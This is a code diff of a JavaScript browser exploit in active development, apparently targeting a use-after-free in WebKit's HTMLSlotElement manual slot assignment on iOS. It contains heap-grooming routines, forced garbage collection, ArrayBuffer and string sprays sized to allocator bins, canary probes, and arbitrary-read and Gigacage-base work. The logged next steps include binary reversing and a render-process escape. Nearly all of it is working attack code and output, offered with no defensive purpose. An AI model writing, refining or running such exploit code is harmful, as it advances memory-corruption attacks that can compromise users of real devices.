+  log('[*]   v65 canary test is definitive: 16384×192B DEADBEEF canaries on 192B LIFO, injected=true,');
+  log('[*]   yet process survived. The specific stale-read at that C++ site is compiler-eliminated.');
+  log('[*]   Need a DIFFERENT C++ code path that reads through m_slots after the bucket is freed.');
+  log('[*] v66 DUAL CANARY STRATEGY:');
+  log('[*]   PROBE A (g=2, 192B): slotchange re-entrant call — JS slotchange handler fires synchronously');
+  log('[*]     during assign(). Handler calls slot.assignedNodes() → internal C++ traversal of m_slots.');
+  log('[*]     If assignedNodes() iterates the OLD bucket (stale ptr) after SHRINK → reads freed memory.');
+  log('[*]     Canary: 16384×192B ArrayBuffer with 0xDEADBEEFDEADBEEF. If deref → KERN_INVALID_ADDRESS.');
+  log('[*]     Mechanism: slotchange fires SYNCHRONOUSLY inside the composed-tree traversal during assign().');
+  log('[*]       JS handler calls slot.assignedNodes() re-entrantly. This goes through a DIFFERENT C++ path');
+  log('[*]       (HTMLSlotElement::assignedNodes, not slotManualAssignmentDidChange) which may have a');
+  log('[*]       separate stale read of m_slots before the function can see the updated ptr.');
+  log('[*]   PROBE B (g=4, 384B): different size class test — g=4 → cap=16 → freedSz=384B.');
+  log('[*]     384B is a different bmalloc size class than 192B. Different SHRINK code path.');
+  log('[*]     If the stale read is present in the g=4 SHRINK variant → crash at 0xDEADBEEFDEADBEEF.');
+  log('[*]     Canary: 16384×384B ArrayBuffer with 0xDEADBEEFDEADBEEF at bytes[0..7].');
+  log('[*] v66 changes:');
+  log('[*]   1. Fix two scope bugs: _p6bCandToTry stub hoisted, summary ref fixed (was: ReferenceError)');
+  log('[*]   2. PROBE A: g=2 uafSetup + slotchange re-entrant assignedNodes() call during trigger');
+  log('[*]      slotchange handler added BEFORE armTrigger, calls slot.assignedNodes() synchronously');
+  log('[*]      logs the returned nodes + any exception — if crash: re-entrant path has stale read');
+  log('[*]   3. PROBE B: g=4 uafSetup (cap=16, freedSz=384B) + 16384×384B DEADBEEF canary spray');
+  log('[*]      separate from Probe A — different size class, different bmalloc bin, different code path');
+  log('[*]   4. Both probes run sequentially — two independent crash opportunities per run');
   } // end if (!_v52RetryState) — phases 3-4 block
   const sentinelClobbers = 0; // v13: no sentinel scan — crash-based detection only
 
@@ -2426,11 +2659,15 @@ function checkNodeLeak(nodes, expectedNode) {
   // We derive it from T9 fit: rank-0 latency intercept corresponds to alloc[0].
   // For now we log the limitation and still run — all probes will crash, documented.
   // NEXT STEP: derive gigacageBase from T9 heap-rank fit intercept (see log below).
+  // v67: hoist p6InjCount/p6Crashes outside gate so summary block can always reference them
+  let p6InjCount = 0;  // injection=true NO-CRASH counter
+  let p6Crashes  = 0;  // crash-reload hit counter
+
   // v24: Run Phase 6 unconditionally (was gated on totalInjections>0 which never ran with async slotchange)
   if (sprayHex && sprayHex.length > 0) {
     log('\n[*] Phase 6: Arb-read primitive — probing oracle candidates...');
     log(`[*] Running on: ${hardConfirmed ? 'HARD confirmed' : 'SOFT signal (injection fired)'}`);
-    log(`[*] Testing top ${Math.min(64, sprayHex ? sprayHex.length : 64)} HIGH-conf candidates as fake key ptrs (v56: window rotates each retry from original list)`);
+    log(`[*] v64: Testing up to 128 HIGH+MED candidates per pass (v64: expanded from 64; HIGH=${(highConf||[]).length} MED=${(medConf||[]).length})`);
     log('[*] VA LIMITATION: oracle offsets are Gigacage-relative, NOT absolute VAs.');
     log('[*]   candidateOffset=0x130000 → key=0x0000000000130000 → unmapped on arm64');
     log('[*]   All probes will crash until gigacageBase is known.');
@@ -2441,10 +2678,11 @@ function checkNodeLeak(nodes, expectedNode) {
     // ── Phase 6 entry canary ─────────────────────────────────────────────────
     log('[P6] ENTRY — v3 confirmed, setting up vars...');
 
-    // GHOSTS=28 → freedSz=1024 → matches SPRAY_SIZES and phase-2 pool
-    // (GHOSTS=200 → freedSz=8192 → outside SPRAY_SIZES → no overlap possible)
-    // v19: changed from 20→28 (20 was invalid: pumpCount=-6, cleanup fires during ghost assign)
-    const P6_GHOSTS = 28;
+    // v58: P6_GHOSTS=2 → cap=8 → freed=8×24=192B (PRIMARY target, binary-confirmed).
+    // pumpCount=1: setup(g+2=4 ops) + release(g=2 ops) + threshold=4 → cleanup at op#2 post-release
+    // then pump 0 times → trigger assign fires cleanup → SHRINK → free(192B) → spray reclaims.
+    // (GHOSTS=200 → freedSz=4800B → outside our spray → no overlap possible)
+    const P6_GHOSTS = 2; // v58: g=2 → freed=192B (was 28 → freed=1536B in 24B math, missed target)
     const p6FreedSz = freedBucketSizeForGhosts(P6_GHOSTS);
     const p6PumpCount = pumpCountForGhosts(P6_GHOSTS);
     const p6MatchedSz = SPRAY_SIZES.reduce((prev, cur) =>
@@ -2485,8 +2723,8 @@ function checkNodeLeak(nodes, expectedNode) {
       ? highConf[0].c * P6_PAGE
       : (sprayHex.length > 0 ? parseInt(sprayHex[0], 16) : 0x10C000);
     const sweepOffset = BigInt(_hcOffset || 0x10C000);
-    const p6sweepFreedSz = freedBucketSizeForGhosts(28);  // v19: 20→28
-    const p6sweepPumpCount = pumpCountForGhosts(28);       // v19: 20→28
+    const p6sweepFreedSz = freedBucketSizeForGhosts(2);  // v58: g=2 → 192B (was 28 for old 16B math)
+    const p6sweepPumpCount = pumpCountForGhosts(2);       // v58: g=2 → pumpCount=1
 
     // ── Check localStorage for prior crash ──────────────────────────────────
     let gigacageBase = 0n;
@@ -2557,12 +2795,12 @@ function checkNodeLeak(nodes, expectedNode) {
       const swB      = swHost.appendChild(document.createElement('span'));
       // v22: batch assign ghosts + swA + swB into swSlot (g+2 ops < threshold ✓)
       const _swGhostElems = [];
-      for (let i = 0; i < 28; ++i) {  // P6_GHOSTS=28 (pumpCount=3, freedSz=1024B)
+      for (let i = 0; i < 2; ++i) {  // v60 FIX: P6A ghosts=2 (matches p6sweepFreedSz=192B; was 28 → mismatch)
         const _sge = document.createElement('span');
         swHost.appendChild(_sge);
         _swGhostElems.push(_sge);
       }
-      swSlot.assign(swA, swB, ..._swGhostElems); // v22: ghosts in swSlot.m_slots (g+2=30 ops < threshold=32 ✓)
+      swSlot.assign(swA, swB, ..._swGhostElems); // v60: g=2 → g+2=4 ops = threshold=4 → cleanup fires (ghosts alive → no shrink) ✓
       // releaseGhosts: reassign swSlot to live-only → drops g ghosts → g ops → cleanup fires once (ghosts still alive → no shrink)
       _swGhostElems.forEach(g => g.remove());
       swSlot.assign(swA, swB);          // v22: drop ghosts from swSlot.m_manuallyAssigned (fires g ensure() calls)
@@ -2571,7 +2809,7 @@ function checkNodeLeak(nodes, expectedNode) {
       let swInjected = false;
       let _swTriggerReady = false; // v15: gate pump-time slotchange
       let _swInjStrings = null; // hold alive past slotchange return for stale deref
-      const _swCharCount = p6sweepFreedSz - 16;
+      const _swCharCount = p6sweepFreedSz - 24; // v60 FIX: arm64e StringImpl header=24B (was -16 → 200B → wrong bin)
       swSlot.addEventListener('slotchange', () => {
         if (!_swTriggerReady) return; // v15: skip pump-time slotchange fires
         const _strs = [];
@@ -2658,14 +2896,20 @@ function checkNodeLeak(nodes, expectedNode) {
       } catch(_) {}
     }
     // v55: store up to 128 candidates in retry state so shuffle covers more of the space
+    // v64: expand candidates to HIGH+MED (up to 128) when HIGH alone < 64.
+    // v63 had 21 HIGH candidates probed per pass — if bucket lands outside those 21, 0 crashes forever.
+    // Fix: fill remaining slots with MED candidates (score topScore-6 to topScore-20) up to 128 total.
+    const _hcArr = highConf || [];
+    const _mcArr = medConf || [];
+    const _v64FullCandidates = _hcArr.length > 0
+      ? [..._hcArr.slice(0, 128), ..._mcArr.slice(0, Math.max(0, 128 - _hcArr.length))].map(s => s.c * P6_PAGE)
+      : sprayHex.slice(0, 128).map(v => parseInt(v, 16));
     const candidates = _v52RetryState
       ? _v52RetryState.candidates.map(Number)
-      : (highConf.length > 0
-          ? highConf.slice(0, 128).map(s => s.c * P6_PAGE)
-          : sprayHex.slice(0, 128).map(v => parseInt(v, 16)));
+      : _v64FullCandidates;
+    log(`[P6B] v64: candidate pool = ${candidates.length} (HIGH=${_hcArr.length} MED-added=${Math.max(0,candidates.length-_hcArr.length)}), probing min(128,${candidates.length})=${Math.min(128,candidates.length)} this pass`);
     let p6Hits = 0;
-    let p6InjCount = 0;  // v52: injection=true NO-CRASH counter (separate from crash-reload hits)
-    let p6Crashes = 0;
+    // p6InjCount and p6Crashes hoisted to outer scope (v67 fix — was causing ReferenceError in summary at line ~3328)
     let p6NoCrashNoAnomaly = 0;
     const p6HitLog = [];
 
@@ -2762,175 +3006,264 @@ function checkNodeLeak(nodes, expectedNode) {
     //    12. check _pc.isInjected()      — injected=true = SHRINK fired + spray ran
     //    If injected: KERN_INVALID_ADDRESS expected. localStorage checkpoint records VA.
 
-    if (gigacageBase === 0n) {
-      log('[P6B] Skipping arb-crash probe sweep — gigacageBase unresolved');
-    }
+    // v66: hoisted stubs so summary block refs don't ReferenceError
+    let _p6bCandToTry = []; // stub — v66 uses two canary probes, no candidate sweep
+    // (p6InjCount, p6Crashes already declared above at line ~2840)
 
-    // v55: expanded probe window — top 64 candidates per pass (was 32)
-    // With 341 HIGH candidates, 32/pass only covers 9% per retry. 64/pass = 19%.
-    // Retry shuffle (below) ensures different slots probed each pass.
-    const _p6bCandToTry = (gigacageBase !== 0n)
-      ? candidates.slice(0, Math.min(64, candidates.length))
-      : [];
+    // v66: DUAL CANARY PROBE — two independent crash tests:
+    //   Probe A (g=2, 192B): slotchange re-entrant assignedNodes() call during SHRINK
+    //   Probe B (g=4, 384B): different size class / code path entirely
+    // v66: DUAL CANARY PROBE IMPLEMENTATION
+    log('[P6B] v66: DUAL CANARY — Probe A (g=2 re-entrant slotchange) + Probe B (g=4 384B)');
+    log('[P6B] v66: Probe A tests slotchange re-entrant assignedNodes() C++ path during SHRINK');
+    log('[P6B] v66: Probe B tests g=4 size class (384B freed bucket) — different code path');
+    log('[P6B] v65: If NO crash → deref path dead on this iOS 26.5.2 build → different primitive needed');
+    log('');
 
-    if (_p6bCandToTry.length > 0) {
-      const P6B_POOL_SIZE = _p6bCandToTry.length;
-      log(`[P6B] v51: building ${P6B_POOL_SIZE} fresh uafSetup cases (Phase 4 recipe)...`);
+    // ── v66 PROBE A: g=2, 192B, slotchange re-entrant assignedNodes() ────────────
+    // Theory: slotchange event fires SYNCHRONOUSLY during the composed-tree traversal
+    // that happens inside assign(). If a JS slotchange handler calls slot.assignedNodes()
+    // re-entrantly, that call goes through HTMLSlotElement::assignedNodes() C++ code,
+    // which may access m_slots (or m_assignedNodes) through a DIFFERENT code path than
+    // slotManualAssignmentDidChange — one that the compiler did NOT CSE.
+    // If this path reads the old (freed) bucket after SHRINK → deref canary → crash.
+    //
+    // PROBE A SEQUENCE:
+    //   1. uafSetup(2): g=2, cap=8, freedSz=192B, pumpCount=1
+    //   2. releaseGhosts → GC confirmed dead
+    //   3. Spray 16384×192B ArrayBuffer canaries (0xDEADBEEFDEADBEEF at bytes[0..7])
+    //   4. GC flush (tick×2) → 192B LIFO saturated
+    //   5. Register slotchange listener on targetSlot → handler calls slot.assignedNodes()
+    //   6. armTrigger → pump → assign(childA) TRIGGER
+    //      slotchange fires synchronously during C++ execution
+    //      handler: slot.assignedNodes() → C++ accesses m_slots (possibly stale after SHRINK)
+    //      If stale read: deref 0xDEADBEEFDEADBEEF → KERN_INVALID_ADDRESS → crash
+    //
+    // ── v66 PROBE B: g=4, 384B, different size class ───────────────────────────
+    // g=4 → cap=16 → oldBucket=16×24=384B (different bmalloc size class than 192B)
+    // Different SHRINK code path. pumpCount=3 for g=4.
+    // If the stale-read path exists for g=4's SHRINK variant → crash at 0xDEADBEEFDEADBEEF.
+    // Canary: 16384×384B ArrayBuffer with 0xDEADBEEFDEADBEEF at bytes[0..7].
 
-      // ── POOL BUILD ─────────────────────────────────────────────────────────
-      // One fresh uafSetup(28) per probe candidate. freedSz=1024B, pumpCount=3.
-      const p6bPool = [];
-      for (let _pi = 0; _pi < P6B_POOL_SIZE; _pi++) {
-        const _pc = uafSetup(28); // ghosts=28 → pumpCount=3, freedSz=1024B
-        await new Promise(r => setTimeout(r, 0));
-        p6bPool.push(_pc);
-      }
-      log(`[P6B] v51: pool built — releasing ghosts on all ${P6B_POOL_SIZE} cases...`);
-
-      // ── RELEASE GHOSTS ─────────────────────────────────────────────────────
-      for (const _pc of p6bPool) _pc.releaseGhosts();
+    // ── PROBE A ──────────────────────────────────────────────────────────────────
+    log('[P6B v66] ── PROBE A: g=2 (192B) + slotchange re-entrant assignedNodes() ──');
+    {
+      log('[P6B v66-A] Building uafSetup(2)...');
+      const _cvA = uafSetup(2);
       await new Promise(r => setTimeout(r, 0));
 
-      // ── BATCH GC — FinalizationRegistry-confirmed loop ─────────────────────
-      // v51: GC target = ALL ghosts (no _ghost0 exclusion).
-      const p6bTotalGhosts = p6bPool.reduce((s, _pc) => s + _pc.ghosts, 0);
-      const p6bGCTarget = p6bTotalGhosts; // v51: all ghosts die — no ghost[0] exclusion
-      const p6bGetDeadTotal = () => p6bPool.reduce((s, _pc) => s + _pc.getGhostDeadCount(), 0);
-      log(`[P6B] v51: waiting for GC — target ${p6bGCTarget}/${p6bTotalGhosts} ghosts (all must die)...`);
-      const p6bGcStart = Date.now();
-      let p6bGcRound = 0;
-      while (p6bGetDeadTotal() < p6bGCTarget) {
-        if (Date.now() - p6bGcStart > 45000) {
-          log(`[P6B GC] ⚠ TIMEOUT — ${p6bGetDeadTotal()}/${p6bGCTarget} confirmed dead, proceeding`);
-          break;
-        }
-        await hardForceGC(`p6b round ${++p6bGcRound} (dead=${p6bGetDeadTotal()}/${p6bGCTarget})`);
+      log('[P6B v66-A] Releasing ghosts...');
+      _cvA.releaseGhosts();
+      await new Promise(r => setTimeout(r, 0));
+
+      // GC confirmed-dead
+      const _cvAGCTarget = _cvA.ghosts;
+      const _cvAGetDead = () => _cvA.getGhostDeadCount();
+      log(`[P6B v66-A] GC wait — target ${_cvAGCTarget} ghosts...`);
+      const _cvAGcStart = Date.now();
+      let _cvAGcRound = 0;
+      while (_cvAGetDead() < _cvAGCTarget) {
+        if (Date.now() - _cvAGcStart > 45000) { log('[P6B v66-A] GC TIMEOUT'); break; }
+        await hardForceGC(`v66-A round ${++_cvAGcRound} (dead=${_cvAGetDead()}/${_cvAGCTarget})`);
         await new Promise(r => setTimeout(r, 400));
         document.body.offsetHeight;
       }
-      log(`[P6B] v51: GC done — ${p6bGetDeadTotal()}/${p6bGCTarget} ghosts confirmed dead (${p6bGcRound} rounds)`);
-
-      // v36: second GC pass — C++ finalizer drain (matches Phase 4 / P6A two-round pattern)
-      await hardForceGC(`p6b extra-round (C++ finalizer drain, dead=${p6bGetDeadTotal()}/${p6bGCTarget})`);
+      log(`[P6B v66-A] GC done — ${_cvAGetDead()}/${_cvAGCTarget} dead (${_cvAGcRound} rounds)`);
+      await hardForceGC('v66-A extra-round');
       await new Promise(r => setTimeout(r, 400));
       document.body.offsetHeight;
-      log(`[P6B] v51: extra GC round done — ${p6bGetDeadTotal()}/${p6bGCTarget} dead`);
-      await new Promise(r => setTimeout(r, 500));
+      await new Promise(r => setTimeout(r, 300));
 
-      // ── PROBE SWEEP ─────────────────────────────────────────────────────────
-      // Phase 4 / P6A exact recipe per probe. No stale WeakPtr machinery.
-      log('[P6B] v51: starting probe sweep (Phase 4 / P6A SHRINK injection recipe)...');
-      for (let ci = 0; ci < _p6bCandToTry.length; ci++) {
-        const candidateOffset = _p6bCandToTry[ci];
-        const _p6bAbsVA = gigacageBase + BigInt(candidateOffset);
-        const _pc = p6bPool[ci];
-        const { targetSlot, childA, childB, pumpCount: _pumpCount } = _pc;
-
-        // Checkpoint BEFORE probe — if page reloads, we know which VA caused the crash
-        try {
-          localStorage.setItem(P6B_LS_KEY, JSON.stringify({
-            idx: ci,
-            va: '0x' + _p6bAbsVA.toString(16),
-            gigacageBase: '0x' + gigacageBase.toString(16),
-            ts: Date.now()
-          }));
-        } catch(_) {}
-
-        // v55: CORRECTED spray size — StringImpl header on arm64e is 24B (not 16B).
-        // arm64e StringImpl layout: m_refCount(4) + m_length(4) + m_hashAndFlags(4) + pad(4) + vtable(8) = 24B
-        // v54 bug: p6FreedSz-16=1008 → 24+1008=1032B → rounds to 2048B bmalloc class → missed freed 1024B slot.
-        // Fix: p6FreedSz-24=1000 chars → 24+1000=1024B → exact 1024B bmalloc class → reclaims freed bucket.
-        const _p6bSprayCharCount = p6FreedSz - 24;  // = 1000 → 1024B exact (arm64e 24B header)
-        const _p6bCharCount = _p6bSprayCharCount;   // alias for compat with log lines below
-        const _p6bEncodedTag = (candidateOffset >> 14) >>> 0;  // metadata only — for log
-        const _p6bHalfCharCount = Math.max(1, Math.floor((_p6bSprayCharCount) / 2));
-
-        let p6Exception = false;
-        let p6Injected = false;
-        try {
-          // v53: per-probe spray override — prime freelist with candidate-encoded charCount
-          // so crash address encodes which candidate fired.
-          // Override the uafSetup STR_CHAR_COUNT with _p6bCharCount for this probe's prime.
-          // We call primeFreelist() from the pool case (uses freedSz-16=1008) then
-          // additionally flood the LIFO with candidate-encoded strings AFTER dropping primed.
-          // Phase 4 / P6A exact recipe + v53 bonus pumps:
-          // Step 5: prime freelist with candidate-encoded strings
-          let _primed = _pc.primeFreelist();
-          // v54: prime freelist with correctly-sized strings (1008 chars = 1024B)
-          // to saturate the LIFO with 1024B-class blocks before trigger fires.
-          const _p6bCandPrime = [];
-          for (let _cpi = 0; _cpi < 256; _cpi++) {
-            const _cs = makeSprayString(_p6bSprayCharCount);  // v54: fixed 1008 chars
-            forceStringHash(_cs);
-            _p6bCandPrime.push(_cs);
-          }
-          forceHashAndRelease(_p6bCandPrime);
-          _primed = null; // drop ref — freed strings hit LIFO freelist
-          // Step 6: 2 ticks — let freed strings settle on LIFO
-          await new Promise(r => setTimeout(r, 0));
-          await new Promise(r => setTimeout(r, 0));
-          // Step 7: arm trigger gate
-          _pc.armTrigger();
-          // Step 8: pump pumpCount-1 times (accumulate opCount, stay just below threshold)
-          const _p6bPumpCount = Math.max(1, _pumpCount - 1);
-          for (let _pi = 0; _pi < _p6bPumpCount; _pi++) {
-            targetSlot.assign(_pi % 2 === 0 ? childB : childA);
-          }
-          // Step 9: tick
-          await new Promise(r => setTimeout(r, 0));
-          // Step 10: final trigger — assign(childA) → opCount threshold → SHRINK → gate open
-          //   SHRINK: free(oldBucket 1024B) → slotchange fires → wave1 spray (4096×1008-char)
-          //   reclaims freed 1024B slot.
-          targetSlot.assign(childA);
-          // ── v56 KEY FIX: zero-tick between trigger and bonus pumps ───────────────
-          // v55 timing: trigger → 2 ticks → bonus pumps → traversal
-          //   Problem: 2 ticks gives bmalloc C++ finalizer time to reuse the freed
-          //   1024B oldBucket BEFORE our spray StringImpl reclaims it.
-          //   The freed slot is given away to internal allocator use → spray misses → no crash.
-          //
-          // v56 fix: trigger → 1 tick (slotchange + spray fire) → IMMEDIATELY bonus pump
-          //   The slotchange fires synchronously after assign(). One tick drains it.
-          //   Then bonus pumps run before any finalizer gets the freed slot back.
-          //   Window: spray StringImpl constructs in tick N, bonus pump traverses in tick N+0.
-          //   This tightens the race: spray must land before finalizer in the SAME tick.
-          //
-          //   10 bonus pumps → opCount=10 > threshold=8 → 2nd amortizedCleanup → crash.
-          await new Promise(r => setTimeout(r, 0));  // 1 tick: slotchange + spray runs
-          // NO second tick — go straight to bonus pumps
-          const _bonusPumps = 10;
-          for (let _bp = 0; _bp < _bonusPumps; _bp++) {
-            targetSlot.assign(_bp % 2 === 0 ? childB : childA);
-          }
-          // Step 12: 1 tick — bonus pump microtasks drain
-          await new Promise(r => setTimeout(r, 0));
-          // Step 13: check injection
-          p6Injected = _pc.isInjected();
-        } catch(e) {
-          p6Exception = true;
+      // Canary spray: 16384×192B
+      const _cvA_COUNT = 16384, _cvA_SZ = 192;
+      log(`[P6B v66-A] Spraying ${_cvA_COUNT}×${_cvA_SZ}B ArrayBuffers with 0xDEADBEEFDEADBEEF...`);
+      {
+        const _cvABufs = [];
+        for (let _i = 0; _i < _cvA_COUNT; _i++) {
+          const _ab = new ArrayBuffer(_cvA_SZ);
+          const _dv = new DataView(_ab);
+          _dv.setUint32(0, 0xDEADBEEF|0, true); // bytes[0..3]
+          _dv.setUint32(4, 0xDEADBEEF|0, true); // bytes[4..7]
+          _dv.setUint32(8, 0x12345678,   true); // bytes[8..11] fake m_hash
+          _cvABufs.push(_ab);
         }
-
-        try { localStorage.removeItem(P6B_LS_KEY); } catch(_) {}
-
-        const absVA = _p6bAbsVA.toString(16).padStart(16,'0');
-        if (p6Exception) {
-          p6Crashes++;
-          log(`[P6B] cand[${ci}]=0x${absVA}: JS-EXCEPTION  injected=${p6Injected}  charCount=0x${_p6bCharCount.toString(16)}`);
-        } else {
-          p6NoCrashNoAnomaly += p6Injected ? 0 : 1;
-          const tag = p6Injected ? ' ← INJECTED (SHRINK fired + spray ran)' : '';
-          const _p6bCharCountHex = '0x' + _p6bCharCount.toString(16);
-          const _p6bTagHex = '0x' + _p6bEncodedTag.toString(16);
-          log(`[P6B] cand[${ci}]=0x${absVA}: NO-CRASH${tag}  injected=${p6Injected}  sprayCharCount=${_p6bCharCountHex}(fixed=1024B)  encodedTag=${_p6bTagHex}`);
-          if (p6Injected) {
-            p6InjCount++;  // v53 FIX: injection=true NO-CRASH → auto-retry path, NOT hit path
-            p6HitLog.push({ candidate: '0x' + candidateOffset.toString(16), injected: true, va: '0x' + _p6bAbsVA.toString(16) });
-          }
-        }
-        if (ci % 4 === 3) await new Promise(r => setTimeout(r, 20));
+        _cvABufs.length = 0; // drop → GC-eligible
       }
-        } else if (gigacageBase !== 0n) {
-      log('[P6B] No candidates from oracle — no sweep to run');
+      await new Promise(r => setTimeout(r, 0));
+      await new Promise(r => setTimeout(r, 0));
+      log('[P6B v66-A] 192B LIFO saturated with canaries');
+
+      // Register slotchange handler that calls assignedNodes() re-entrantly
+      const { targetSlot: _cvASlot, childA: _cvAA, childB: _cvAB, pumpCount: _cvAPump } = _cvA;
+      let _cvAReentrantNodes = null;
+      let _cvAReentrantException = null;
+      let _cvAHandlerFired = false;
+      const _cvAHandler = () => {
+        _cvAHandlerFired = true;
+        try {
+          // Re-entrant call into C++ assignedNodes() during SHRINK's C++ stack
+          // If m_slots was freed before this executes and this reads stale ptr → crash
+          _cvAReentrantNodes = _cvASlot.assignedNodes();
+        } catch(e) {
+          _cvAReentrantException = String(e);
+        }
+      };
+      _cvASlot.addEventListener('slotchange', _cvAHandler);
+      log('[P6B v66-A] slotchange handler registered (re-entrant assignedNodes() call)');
+
+      _cvA.armTrigger();
+
+      // Pump: g=2 pumpCount=1 → pump max(1, pumpCount-1)=1 time
+      const _cvAPumpN = Math.max(1, _cvAPump - 1);
+      for (let _pi = 0; _pi < _cvAPumpN; _pi++) {
+        _cvASlot.assign(_pi % 2 === 0 ? _cvAB : _cvAA);
+      }
+
+      try {
+        localStorage.setItem(P6B_LS_KEY, JSON.stringify({
+          probe: 'A-v66', va: 'canary:0xDEADBEEFDEADBEEF', ts: Date.now()
+        }));
+      } catch(_) {}
+
+      log('[P6B v66-A] FIRING TRIGGER → slotchange re-entrant assignedNodes() during SHRINK...');
+      let _cvAException = false, _cvAInjected = false;
+      try {
+        _cvASlot.assign(_cvAA); // TRIGGER
+        await new Promise(r => setTimeout(r, 0));
+        _cvAInjected = _cvA.isInjected();
+      } catch(e) {
+        _cvAException = true;
+      }
+      try { localStorage.removeItem(P6B_LS_KEY); } catch(_) {}
+
+      // Remove handler
+      try { _cvASlot.removeEventListener('slotchange', _cvAHandler); } catch(_) {}
+
+      log('');
+      log('[P6B v66-A] ══════════════════════════════════════════════');
+      log(`[P6B v66-A] PROBE A RESULT: exception=${_cvAException}  injected=${_cvAInjected}  handlerFired=${_cvAHandlerFired}`);
+      log(`[P6B v66-A]   reentrantNodes=${_cvAReentrantNodes ? _cvAReentrantNodes.length : 'null'}  reentrantException=${_cvAReentrantException}`);
+      if (_cvAException) {
+        p6Crashes++;
+        log('[P6B v66-A] JS exception during trigger — check DOM setup, not a KERN_INVALID_ADDRESS');
+      } else if (_cvAInjected) {
+        p6InjCount++;
+        p6NoCrashNoAnomaly++;
+        log('[P6B v66-A] SHRINK fired (injected=true) + re-entrant assignedNodes() ran — NO CRASH');
+        log('[P6B v66-A] re-entrant assignedNodes() path also does not produce stale deref on 26.5.2');
+        if (!_cvAHandlerFired) log('[P6B v66-A] ⚠ slotchange handler did NOT fire — re-entrant path not reached');
+      } else {
+        p6NoCrashNoAnomaly++;
+        log('[P6B v66-A] SHRINK did NOT fire (injected=false) — uafSetup g=2 threshold issue');
+      }
+      log('[P6B v66-A] ══════════════════════════════════════════════');
     }
+
+    // ── PROBE B ──────────────────────────────────────────────────────────────────
+    log('');
+    log('[P6B v66] ── PROBE B: g=4 (384B freed bucket, different size class) ──');
+    {
+      log('[P6B v66-B] Building uafSetup(4)...');
+      const _cvB = uafSetup(4);
+      await new Promise(r => setTimeout(r, 0));
+
+      log('[P6B v66-B] Releasing ghosts...');
+      _cvB.releaseGhosts();
+      await new Promise(r => setTimeout(r, 0));
+
+      // GC confirmed-dead
+      const _cvBGCTarget = _cvB.ghosts;
+      const _cvBGetDead = () => _cvB.getGhostDeadCount();
+      log(`[P6B v66-B] GC wait — target ${_cvBGCTarget} ghosts (g=4)...`);
+      const _cvBGcStart = Date.now();
+      let _cvBGcRound = 0;
+      while (_cvBGetDead() < _cvBGCTarget) {
+        if (Date.now() - _cvBGcStart > 45000) { log('[P6B v66-B] GC TIMEOUT'); break; }
+        await hardForceGC(`v66-B round ${++_cvBGcRound} (dead=${_cvBGetDead()}/${_cvBGCTarget})`);
+        await new Promise(r => setTimeout(r, 400));
+        document.body.offsetHeight;
+      }
+      log(`[P6B v66-B] GC done — ${_cvBGetDead()}/${_cvBGCTarget} dead (${_cvBGcRound} rounds)`);
+      await hardForceGC('v66-B extra-round');
+      await new Promise(r => setTimeout(r, 400));
+      document.body.offsetHeight;
+      await new Promise(r => setTimeout(r, 300));
+
+      // Canary spray: 16384×384B (g=4 → cap=16 → freed oldBucket=16×24=384B)
+      const _cvB_COUNT = 16384, _cvB_SZ = 384;
+      log(`[P6B v66-B] Spraying ${_cvB_COUNT}×${_cvB_SZ}B ArrayBuffers with 0xDEADBEEFDEADBEEF...`);
+      {
+        const _cvBBufs = [];
+        for (let _i = 0; _i < _cvB_COUNT; _i++) {
+          const _ab = new ArrayBuffer(_cvB_SZ);
+          const _dv = new DataView(_ab);
+          _dv.setUint32(0, 0xDEADBEEF|0, true); // bytes[0..3]
+          _dv.setUint32(4, 0xDEADBEEF|0, true); // bytes[4..7]
+          _dv.setUint32(8, 0x12345678,   true); // bytes[8..11] fake m_hash
+          _cvBBufs.push(_ab);
+        }
+        _cvBBufs.length = 0; // drop → GC-eligible
+      }
+      await new Promise(r => setTimeout(r, 0));
+      await new Promise(r => setTimeout(r, 0));
+      log('[P6B v66-B] 384B LIFO saturated with 0xDEADBEEFDEADBEEF canaries');
+
+      const { targetSlot: _cvBSlot, childA: _cvBA, childB: _cvBB, pumpCount: _cvBPump } = _cvB;
+      _cvB.armTrigger();
+
+      // g=4: pumpCount=3 → pump max(1, 3-1)=2 times before trigger
+      const _cvBPumpN = Math.max(1, _cvBPump - 1);
+      for (let _pi = 0; _pi < _cvBPumpN; _pi++) {
+        _cvBSlot.assign(_pi % 2 === 0 ? _cvBB : _cvBA);
+      }
+
+      try {
+        localStorage.setItem(P6B_LS_KEY, JSON.stringify({
+          probe: 'B-v66', sz: 384, va: 'canary:0xDEADBEEFDEADBEEF', ts: Date.now()
+        }));
+      } catch(_) {}
+
+      log('[P6B v66-B] FIRING TRIGGER: g=4 → SHRINK frees 384B bucket...');
+      log('[P6B v66-B] If deref executes: 0xDEADBEEFDEADBEEF → KERN_INVALID_ADDRESS → crash');
+      log('[P6B v66-B] If page survives: g=4 code path also dead on 26.5.2');
+      let _cvBException = false, _cvBInjected = false;
+      try {
+        _cvBSlot.assign(_cvBA); // TRIGGER
+        await new Promise(r => setTimeout(r, 0));
+        _cvBInjected = _cvB.isInjected();
+      } catch(e) {
+        _cvBException = true;
+      }
+      try { localStorage.removeItem(P6B_LS_KEY); } catch(_) {}
+
+      log('');
+      log('[P6B v66-B] ══════════════════════════════════════════════');
+      log(`[P6B v66-B] PROBE B RESULT: exception=${_cvBException}  injected=${_cvBInjected}`);
+      if (_cvBException) {
+        p6Crashes++;
+        log('[P6B v66-B] JS exception — check DOM setup');
+      } else if (_cvBInjected) {
+        p6InjCount++;
+        p6NoCrashNoAnomaly++;
+        log('[P6B v66-B] SHRINK fired (injected=true) BUT no crash');
+        log('[P6B v66-B] g=4 (384B) code path is also dead on iOS 26.5.2');
+        log('[P6B v66-B] COMBINED v65+v66 DIAGNOSIS:');
+        log('[P6B v66-B]   All tested stale-deref paths are dead on this build.');
+        log('[P6B v66-B]   Hypothesis B fully confirmed across multiple code paths.');
+        log('[P6B v66-B]   NEXT STEP OPTIONS:');
+        log('[P6B v66-B]   1. Binary audit: reverse slotManualAssignmentDidChange on 26.5.2 dyld shared cache');
+        log('[P6B v66-B]      → ipsw.me / dyld-shared-cache-extractor → ida/ghidra → find actual UAF site');
+        log('[P6B v66-B]   2. Different rdar: use a different WebKit bug from iOS 26.5.2 era');
+        log('[P6B v66-B]   3. Pivot to render-process escape via different slot-assignment race');
+        log('[P6B v66-B]      (mutation observer, TreeScope traversal during slot reassignment)');
+      } else {
+        p6NoCrashNoAnomaly++;
+        log('[P6B v66-B] SHRINK did NOT fire (injected=false) — uafSetup g=4 threshold issue');
+        log('[P6B v66-B] g=4: cap=16, threshold=8, pumpCount=3 — check opCount accumulation');
+      }
+      log('[P6B v66-B] ══════════════════════════════════════════════');
